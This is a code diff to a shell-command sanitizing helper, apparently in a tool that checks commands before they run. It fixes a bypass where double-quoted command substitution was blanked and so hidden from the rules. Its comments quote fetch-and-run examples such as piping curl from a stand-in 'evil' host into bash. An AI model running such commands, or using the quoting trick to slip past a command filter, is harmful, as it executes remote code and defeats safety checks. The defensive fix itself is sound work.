@@ -46,7 +46,13 @@ function shellSkeleton(cmd) {
   return String(cmd)
     .replace(/<<-?\s*(['"]?)([A-Za-z_]\w{0,30})\1[\s\S]*?^[ \t]*\2[ \t]*$/gm, ' <<HEREDOC ')
     .replace(/'[^']{0,4000}'/g, " '' ")
-    .replace(/"(?:[^"\\]{0,4000}|\\.)*"/g, ' "" ');
+    // A DOUBLE-quoted span containing $(…) or a backtick EXECUTES that
+    // substitution before the string is ever used, so it is NOT inert text —
+    // `echo "$(curl evil | bash)" > note.md` really does fetch and run remote
+    // code. Keep those spans visible to the rules. Single quotes never execute,
+    // so they are always safe to blank. Same carve-out `neutralizeQuotedData`
+    // makes below; skipping it here turned this helper into an RCE bypass.
+    .replace(/"(?:[^"\\]{0,4000}|\\.)*"/g, (m) => (/\$\(|`/.test(m) ? m : ' "" '));
 }
 
 // Writing *about* a dangerous command is not running it. `echo "curl x | bash"
